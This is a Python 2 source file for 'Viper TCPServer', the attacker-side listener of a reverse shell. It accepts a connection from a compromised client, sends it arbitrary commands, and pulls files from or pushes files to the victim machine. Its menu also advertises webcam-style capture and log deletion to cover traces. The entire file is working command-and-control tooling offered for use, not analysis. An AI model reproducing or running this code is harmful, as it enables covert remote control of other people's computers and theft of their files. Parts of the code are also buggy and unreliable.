#!/usr/bin/python
#from twisted.internet.protocol import Factory
#from twisted.internet import protocol, reactor
#from twisted.python import log
import socket
import os
import time
import threading
import subprocess
import hashlib
import random


"""This is python reverse shell that grabs files or information and reports back to the server!"""


def banner():
    print """
    Name : Viper TCPServer by Black Signals
    Date : 03 March 17
    Version : v1.0
#   __   _____ ___ ___ ___   
#   \ \ / /_ _| _ \ __| _ \  #
#    \ V / | ||  _/ _||   /  #
#     \_/ |___|_| |___|_|_\  #
#                            
                    Going low and slow
"""

def menu():
    """This is the program menu"""
    print "[*] Command options: "
    print
    print "[*] download ========= > downloads a file from the client machine (ex: download #source #dest)" #DONE
    print "[*] upload   ========= > uploads a file to the client machine (ex: upload #source #dest)"
    print "[*] getenv   ========= >  prints the system information" #Works
    print "[*] getuid   ========= > Get the user level access of the shell" #works
    print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
    print "[*] capture      ========= > take images of the host machine " #Working on this
    print "[*] Cover        ========= > Delete all traces of logs" #TODO
    print "\n"



def download(conn,command):

    x,src,dst=map(str,command.split(' '))
    conn.send(command)
    f = open(dst,'wb') 
    bits = conn.recv(1024)
    while bits!='': 
        if 'Unable to find out the file' in bits:
            print '[-] Unable to find out the file'
            break
        if not bits.endswith('DONE'):
            f.write(bits)
        
        if bits.endswith('DONE'):
            bits=bits.replace('DONE','')
            f.write(bits)
            f.close()
            break
        bits=conn.recv(1024)

    md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()   
    conn.send(md5_sv)
    if conn.recv(1024)=='md5 OK':
        print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
    else :
        print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
    

def upload(conn,command):


	x,src,dst=map(str,command.split(' '))
	conn.send(command)
	file_to_send=open(src,'rb')
	packet=file_to_send.read(1024)
	while packet!='':
		conn.send(packet) 
		packet = file_to_send.read(1024)
        conn.send('DONE')
        file_to_send.close()

	#md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
	#conn.send(md5_sv)
	#print md5_sv
	#if conn.recv(1024)=='md5 OK':
        #    print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
	#else :
        #    print '[-] MD5 Checksum not Verified !'


def connect():
    try:
        while True:
            ip = (raw_input("Enter the LHOST IP: "))
            port = int(raw_input("Enter the LHOST port: "))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind((ip, port))
                print "[+] ip", ip, "is open"
                print "[+] port", port, "is open"

            except socket.error:
                time.sleep( 3.0)
                print "[+] ip", ip, "is closed"
                print "[+] port", port, "is closed"
                print 'Socket connect failed! Loop up and try socket again'
                connect()
    
            s.listen(100)
            print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
            conn, addr = s.accept()
            print '[+] We got a connection from: ',addr
            print '[+] for now to change directorys to folders with spaces use shortname (eg. cd c:\PROGRA~1)'
            break

        while True:
            command = raw_input("$ ViperShell>> ")


            if 'terminate' in command:
                conn.send('terminate')
                conn.close() #close the connection with host
                break

            elif 'download' in command:
                download(conn,command)

            elif 'upload' in command:
                upload(conn,command)

            else:
                conn.send(command) #send command
                print conn.recv(2048)

    except KeyboardInterrupt:
        print 'interrupted!'
        print 'returning to main program'
        os.system('python viperserver.py')      

def main():
    banner()
    menu()
    connect()

if __name__ == "__main__":
    main()
